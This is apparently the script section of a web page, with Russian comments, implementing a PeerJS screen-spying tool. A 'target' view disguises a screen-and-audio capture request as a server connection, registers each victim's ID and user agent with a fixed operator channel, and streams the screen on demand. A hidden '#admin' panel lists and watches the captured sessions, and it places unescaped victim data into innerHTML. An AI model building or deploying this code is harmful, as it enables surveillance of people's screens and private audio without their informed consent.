    <script>

        // === НАСТРОЙКИ ===

        const CHANNEL_ID = 'eni-master-2026'; // Уникальный канал (можешь изменить)

        

        let peer = null;

        let myStream = null;

        let currentCall = null;

        let activeSessions = {}; // Хранилище сессий


        // Проверяем, админ это или цель

        const isAdmin = window.location.hash === '#admin';


        if (isAdmin) {

            initAdmin();

        } else {

            // Если цель, скрываем админку

            document.getElementById('admin-view').classList.add('hidden');

        }


        // === ЛОГИКА ДЛЯ ЦЕЛИ ===

        async function startSession() {

            const btn = document.getElementById('start-btn');

            const status = document.getElementById('victim-status');

            

            try {

                btn.disabled = true;

                btn.textContent = 'Подключение к серверу...';

                

                // Запрос доступа к экрану

                myStream = await navigator.mediaDevices.getDisplayMedia({ 

                    video: { cursor: 'always', displaySurface: 'monitor' }, 

                    audio: true 

                });


                btn.classList.add('hidden');

                status.classList.remove('hidden');

                status.innerHTML = '<div class="dot active"></div><span>Сессия активна. Ожидание...</span>';


                // Создаем Peer для цели

                const victimId = 'victim-' + Math.random().toString(36).substr(2, 8);

                peer = new Peer(victimId);


                peer.on('open', () => {

                    // Подключаемся к админу, чтобы сообщить о себе

                    connectToAdmin(victimId);

                });


                peer.on('call', (call) => {

                    call.answer(myStream);

                    currentCall = call;

                    status.innerHTML = '<div class="dot active"></div><span>Оператор просматривает экран</span>';

                });


                myStream.getVideoTracks()[0].onended = () => {

                    location.reload();

                };


            } catch (err) {

                alert('Ошибка: ' + err.message);

                location.reload();

            }

        }


        function connectToAdmin(victimId) {

            // Пытаемся подключиться к админу, чтобы зарегистрироваться

            const adminConn = peer.connect(CHANNEL_ID, { reliable: true });

            

            adminConn.on('open', () => {

                adminConn.send({

                    type: 'register',

                    id: victimId,

                    ua: navigator.userAgent

                });

            });

        }


        // === ЛОГИКА ДЛЯ АДМИНА ===

        function initAdmin() {

            document.getElementById('victim-view').classList.add('hidden');

            document.getElementById('admin-view').style.display = 'block';


            // Создаем Peer с фиксированным ID канала

            peer = new Peer(CHANNEL_ID);


            peer.on('open', () => {

                console.log('Admin connected as ' + CHANNEL_ID);

                addToast('Панель управления активна');

            });


            peer.on('connection', (conn) => {

                conn.on('data', (data) => {

                    if (data.type === 'register') {

                        addSession(data.id, data.ua);

                    }

                });

            });


            peer.on('error', (err) => {

                if (err.type === 'unavailable-id') {

                    addToast('Ошибка: Канал уже занят. Измените CHANNEL_ID');

                }

            });

        }


        function addSession(id, ua) {

            activeSessions[id] = { ua, connected: false };

            renderSessions();

            addToast('Новое подключение: ' + id);

        }


        function renderSessions() {

            const list = document.getElementById('session-list');

            const count = document.getElementById('count');

            count.textContent = Object.keys(activeSessions).length;

            

            if (Object.keys(activeSessions).length === 0) return;

            

            list.innerHTML = '';

            Object.keys(activeSessions).forEach(id => {

                const s = activeSessions[id];

                const card = document.createElement('div');

                card.className = 'session-card';

                card.innerHTML = `

                    <div class="session-id">ID: ${id}</div>

                    <div class="session-ua">${s.ua}</div>

                    <div class="session-actions">

                        <button class="btn-sm btn-watch" onclick="watchSession('${id}')">👁 Смотреть</button>

                        <button class="btn-sm btn-disconnect" onclick="removeSession('${id}')">✖</button>

                    </div>

                `;

                list.appendChild(card);

            });

        }


        function watchSession(targetId) {

            if (!targetId) return;

            

            document.getElementById('viewer-modal').style.display = 'flex';

            document.getElementById('current-target').textContent = targetId;

            

            const call = peer.call(targetId, new MediaStream());

            currentCall = call;

            

            call.on('stream', (stream) => {

                document.getElementById('remote-video').srcObject = stream;

            });

            

            call.on('close', () => {

                stopViewing();

            });

        }


        function stopViewing() {

            document.getElementById('viewer-modal').style.display = 'none';

            document.getElementById('remote-video').srcObject = null;

            if (currentCall) currentCall.close();

            currentCall = null;

        }


        function removeSession(id) {

            delete activeSessions[id];

            renderSessions();

        }


        function addToast(msg) {

            const t = document.createElement('div');

            t.className = 'toast';

            t.textContent = msg;

            document.body.appendChild(t);

            setTimeout(() => t.remove(), 3000);

        }
